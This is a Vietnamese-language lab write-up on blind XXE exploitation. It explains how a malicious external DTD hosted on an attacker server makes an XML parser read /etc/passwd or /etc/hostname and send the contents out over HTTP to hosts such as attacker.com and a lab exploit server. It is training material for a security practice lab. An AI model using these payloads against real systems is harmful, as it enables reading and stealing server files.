# Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the /etc/hostname file.

# Example


Giả sử chúng ta có một ứng dụng web cho phép người dùng nhập dữ liệu và xem nội dung của tệp XML được tạo ra từ dữ liệu đó. Ứng dụng này sử dụng một quá trình phân tích XML để phân tích và hiển thị dữ liệu.

Tuy nhiên, ứng dụng này bị mắc lỗi XXE và không kiểm tra và ngăn chặn các entity bên ngoài được tham chiếu trong tài liệu XML. Điều này có nghĩa là chúng ta có thể sử dụng một tệp DTD bên ngoài để thực hiện cuộc tấn công blind XXE và lấy trộm dữ liệu từ hệ thống mục tiêu.

Ví dụ, chúng ta có tệp DTD độc hại có tên "evil.dtd" với nội dung sau:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
```

Trong ví dụ này, chúng ta định nghĩa một entity có tên "file" để tham chiếu tới tệp "/etc/passwd" và sử dụng entity "exfiltrate" để gửi dữ liệu đó tới một máy chủ của kẻ tấn công thông qua một yêu cầu HTTP.

Sau đó, chúng ta tạo một tệp XML bằng cách sử dụng tệp DTD bên ngoài và gửi nó tới ứng dụng web mục tiêu:

```xml
<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
<foo>&exfiltrate;</foo>
```

Khi ứng dụng web phân tích tệp XML này, nó sẽ tải tệp DTD từ địa chỉ `"http://attacker.com/evil.dtd"`. Tệp DTD độc hại sẽ tạo ra một yêu cầu HTTP tới máy chủ của kẻ tấn công chứa dữ liệu được lấy từ "/etc/passwd". Kẻ tấn công có thể thu thập và lưu trữ dữ liệu đó.

# Solution:

Ta có form của lab như sau

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/8c22258d-5c53-4290-91c4-dfed90a6ed35)

Làm như tương tự các lab trước, ta check stock

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/3e590be1-3c13-40b7-879f-452a6ce7a0a5)

Kế đó ta xác dịnh doctype và sau đó là entity là `loadDtd` và sử dụng lệnh `SYSTEM` để exploit server `https://exploit-0a0800540448e7c881e70c6b01670003.exploit-server.net/`

```xml
<!DOCTYPE test [<!ENTITY % loadDtd SYSTEM "https://exploit-0a0800540448e7c881e70c6b01670003.exploit-server.net/exploit">]
```

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/c5a037a1-d6e7-4764-a979-b588d9cc281d)


Sau đó ta cần host `loadDtd` file. Chúng ta cần host bời vì ta sẽ sử dụng Stack Entities

```xml
<!ENTITY  %file SYSTEM "file:///etc/hostname">
<!ENTITY % stack SYSTEM "<!ENTITY &#x25; exfil 'http://attacker-server.com/%file;'>">
%stack;
%exfil;
```

Đoạn mã trên định nghĩa các entity trong XML để thực hiện một cuộc tấn công XXE thông qua stack entities. Cụ thể:

- Dòng đầu tiên `<!ENTITY  %file SYSTEM "file:///etc/hostname">` định nghĩa một entity `%file` mà giá trị của nó là nội dung của tệp `/etc/hostname` trên hệ thống.
- Dòng thứ hai `<!ENTITY % stack SYSTEM "<!ENTITY &#x25; exfil 'http://attacker-server.com/%file;'>">` định nghĩa một entity `%stack` mà giá trị của nó là một đoạn văn bản XML mới chứa một entity `%exfil` đặc biệt.
- Dòng thứ ba `%stack;` sử dụng entity `%stack`, trong đó nói với trình phân tích XML rằng nó nên chèn nội dung của entity `%stack` vào tài liệu XML chính.
- Dòng thứ tư `%exfil;` sử dụng entity `%exfil`, nó chèn URL `http://attacker-server.com/%file` vào tài liệu XML. Điều này có thể được sử dụng để exfiltrate (đánh cắp) dữ liệu từ tệp `/etc/hostname` thông qua việc gửi yêu cầu HTTP đến máy chủ tấn công `http://attacker-server.com`.

Qua đó, tấn công này cố gắng đọc nội dung của tệp `/etc/hostname` trên máy chủ mục tiêu và gửi nó đến máy chủ tấn công thông qua exfiltration.

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/88218a45-4868-4621-aa61-b63793d5190c)

Vậy thì sau khi xml praser xử lí xml của ta nó sẽ tìm kiếm file dtd của ta tại exploit server sau `/exploit`. Tiếp theo ta cần host  file dtd. Ta cần thêm 3 entites cho exploit server

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0a1600ae04f6082c8344097501030025.exploit-server.net/?%file;'>"> 
```

Dòng đầu tiên: <!ENTITY %file SYSTEM "file:///etc/hostname"> định nghĩa một entity %file mà giá trị của nó là nội dung của tệp /etc/hostname trên hệ thống. Đây là một phần hợp lệ của XXE, cho phép đọc tệp từ hệ thống.

Dòng thứ hai: <!ENTITY %stack SYSTEM "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0a0800540448e7c881e70c6b01670003.exploit-server.net/?%file;'>"> định nghĩa một entity %stack mà giá trị của nó là một đoạn văn bản XML mới. Đoạn văn bản này tạo ra một entity con %exfil với giá trị là URL https://exploit-0a0800540448e7c881e70c6b01670003.exploit-server.net/?%file;.

Đoạn mã này có tác dụng tạo ra một chuỗi các entity, cho phép tấn công viên truy cập URL https://exploit-0a0800540448e7c881e70c6b01670003.exploit-server.net/?%file; và exfiltrate (đánh cắp) nội dung của tệp /etc/hostname.

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/4b8684be-8dfe-4938-a088-96bdb41c2a23)

Sau đó ta cần tham chiếu `stack` và `exfil` mà ta đã tạo trong exploit server

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/72354315-7d4b-4798-b8ee-307007ab6d48)

Sau đó chỉ cần `store exploit` và send request và access log

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/55c7d988-b8de-41b9-abe9-cabe71e69e76)

Sumbit solution là xong lab.

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/4122c74f-2b2f-4a66-ad1e-a16f795d16e6)


